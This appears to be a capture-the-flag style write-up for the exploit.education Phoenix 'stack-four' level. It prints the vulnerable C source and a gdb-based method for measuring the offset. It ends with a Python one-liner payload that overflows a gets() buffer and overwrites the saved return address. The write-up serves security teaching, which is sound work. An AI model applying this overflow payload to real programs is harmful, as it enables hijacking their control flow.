# STACK FOUR

## SOURCE CODE

```c
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```
## STRATEGY
First we need to use objdump and see what is the address of *'complete_level'* function, then
is possible to use different strategies, we will use the gdb way, so that's the plan:
- run gdb and pass 64 "A" to fill the buffer, then step the code and when the function print *'and will be returning to %p\n'* we get the address and explore the stack and count how many  more byte we need to fill before overwrite the return address printed

## EXPLOIT
1.
```shell
objdump -d stack-four
```
address: 080484e5

Running the program with gdb, the function will be returning to *'0x804855c'* but printing the stack before return (with *'x/50w $esp'*) give us 2 differt *'0x804855c'*. The second is the real return address, so we count 16 byte between end of buffer return address.

2. 
```shell
python -c 'import struct; print "A"*64 + "B"*16 + struct.pack("I",0x080484e5)' | ./stack-four
```
